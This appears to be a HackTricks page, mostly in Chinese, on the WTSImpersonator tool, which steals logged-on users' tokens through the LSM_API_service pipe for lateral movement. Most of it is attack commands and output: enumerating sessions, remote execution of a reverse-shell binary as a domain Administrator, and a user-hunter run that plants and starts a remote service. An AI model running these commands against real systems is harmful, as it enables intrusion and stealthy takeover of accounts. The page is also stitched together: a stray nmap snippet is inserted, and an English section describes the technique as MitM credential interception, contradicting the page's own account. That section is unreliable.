<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？想要在HackTricks中**宣传你的公司**吗？或者你想要**获取PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或者 [**Telegram群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

WTS Impersonator滥用“**\\pipe\LSM_API_service**”RPC命名管道来枚举已登录的用户并窃取其他用户的令牌，而不使用正常的“令牌模拟技术”，这样可以在保持隐蔽的同时进行良好且轻松的横向移动，这项技术由[Omri Baso](https://www.linkedin.com/in/omri-baso/)研究和开发。

可以在[github](https://github.com/OmriBaso/WTSImpersonator)上找到`WTSImpersonator`工具。
```
WTSEnumerateSessionsA → WTSQuerySessionInformationA -> WTSQueryUserToken -> CreateProcessAsUserW
```
#### `enum` 模块：

枚举在工具所在的机器上的本地用户
```powershell
.\WTSImpersonator.exe -m enum
```
给定一个IP地址或主机名，远程枚举一台机器。

```bash
nmap -p- -sV <IP或主机名>
```

使用Nmap工具进行端口扫描，通过指定IP地址或主机名，扫描所有端口并获取服务版本信息。
```powershell  
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```
#### `exec` / `exec-remote` 模块：
无论是 "exec" 还是 "exec-remote" 都需要处于 **"Service"** 上下文中。
本地的 "exec" 模块只需要 WTSImpersonator.exe 和要执行的二进制文件 \(-c 标志\)，可以是正常的 "C:\\Windows\\System32\\cmd.exe"，这样你就可以以所需的用户身份打开一个 CMD，例如：
```powershell
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
你可以使用PsExec64.exe来获取服务上下文。
```powershell
.\PsExec64.exe -accepteula -s cmd.exe
```
对于`exec-remote`，情况有些不同，我创建了一个可以像`PsExec.exe`一样远程安装的服务
该服务将接收`SessionId`和要运行的`二进制文件`作为参数，并在具备适当权限的情况下进行远程安装和执行
一个示例运行如下所示：
```powershell
PS C:\Users\Jon\Desktop> .\WTSImpersonator.exe -m enum -s 192.168.40.129

__          _________ _____ _____                                                 _
\ \        / /__   __/ ____|_   _|                                               | |
\ \  /\  / /   | | | (___   | |  _ __ ___  _ __   ___ _ __ ___  ___  _ __   __ _| |_ ___  _ __
\ \/  \/ /    | |  \___ \  | | | '_ ` _ \| '_ \ / _ \ '__/ __|/ _ \| '_ \ / _` | __/ _ \| '__|
\  /\  /     | |  ____) |_| |_| | | | | | |_) |  __/ |  \__ \ (_) | | | | (_| | || (_) | |
\/  \/      |_| |_____/|_____|_| |_| |_| .__/ \___|_|  |___/\___/|_| |_|\__,_|\__\___/|_|
| |
|_|
By: Omri Baso
WTSEnumerateSessions count: 1
[2] SessionId: 2 State: WTSDisconnected (4) WinstationName: ''
WTSUserName:  Administrator
WTSDomainName: LABS
WTSConnectState: 4 (WTSDisconnected)
```
如上所示，管理员帐户的`Sessionid`为`2`，因此我们在远程执行代码时将其用于`id`变量中。
```powershell
PS C:\Users\Jon\Desktop> .\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```
#### `user-hunter` 模块：

用户猎手模块将使您能够枚举多台计算机，并在找到给定用户时代表该用户执行代码。
当您在几台计算机上拥有本地管理员权限时，这对于寻找“域管理员”非常有用。
```powershell
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```
# WTS Impersonator

The WTS Impersonator technique allows an attacker to steal user credentials by impersonating a Windows Terminal Server (WTS) session.

## Description

When a user logs into a Windows Terminal Server, a session is created for that user. This session is managed by the Windows Terminal Services (WTS) service. The WTS Impersonator technique takes advantage of the fact that the WTS service uses the user's credentials to authenticate and authorize actions within the session.

By impersonating a WTS session, an attacker can intercept and steal the user's credentials as they are passed to the WTS service for authentication. This can be done by injecting malicious code into the WTS service or by using a Man-in-the-Middle (MitM) attack to intercept the credentials in transit.

Once the attacker has obtained the user's credentials, they can use them to gain unauthorized access to the user's account or to perform other malicious activities.

## Mitigation

To mitigate the risk of WTS Impersonator attacks, it is recommended to:

1. Implement strong authentication mechanisms, such as multi-factor authentication, to make it harder for attackers to steal user credentials.
2. Regularly update and patch the Windows Terminal Server and associated software to protect against known vulnerabilities.
3. Monitor network traffic for signs of suspicious activity, such as unauthorized access attempts or unusual data transfers.
4. Educate users about the risks of phishing attacks and other social engineering techniques that can be used to steal credentials.

By following these mitigation measures, organizations can reduce the likelihood of falling victim to WTS Impersonator attacks and protect their users' credentials from being stolen.
```powershell
PS C:\Users\Jon\Desktop> .\WTSImpersonator.exe -m user-hunter -uh LABS/Administrator -ipl .\test.txt -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe

__          _________ _____ _____                                                 _
\ \        / /__   __/ ____|_   _|                                               | |
\ \  /\  / /   | | | (___   | |  _ __ ___  _ __   ___ _ __ ___  ___  _ __   __ _| |_ ___  _ __
\ \/  \/ /    | |  \___ \  | | | '_ ` _ \| '_ \ / _ \ '__/ __|/ _ \| '_ \ / _` | __/ _ \| '__|
\  /\  /     | |  ____) |_| |_| | | | | | |_) |  __/ |  \__ \ (_) | | | | (_| | || (_) | |
\/  \/      |_| |_____/|_____|_| |_| |_| .__/ \___|_|  |___/\___/|_| |_|\__,_|\__\___/|_|
| |
|_|
By: Omri Baso

[+] Hunting for: LABS/Administrator On list: .\test.txt
[-] Trying: 192.168.40.131
[+] Opned WTS Handle: 192.168.40.131
[-] Trying: 192.168.40.129
[+] Opned WTS Handle: 192.168.40.129

----------------------------------------
[+] Found User: LABS/Administrator On Server: 192.168.40.129
[+] Getting Code Execution as: LABS/Administrator
[+] Trying to execute remotly
[+] Transfering file remotely from: .\WTSService.exe To: \\192.168.40.129\admin$\voli.exe
[+] Transfering file remotely from: .\SimpleReverseShellExample.exe To: \\192.168.40.129\admin$\DrkSIM.exe
[+] Successfully transfered file!
[+] Successfully transfered file!
[+] Sucessfully Transferred Both Files
[+] Will Create Service voli
[+] Create Service Success : "C:\Windows\voli.exe" 2 C:\Windows\DrkSIM.exe
[+] OpenService Success!
[+] Started Sevice Sucessfully!

[+] Deleted Service
```

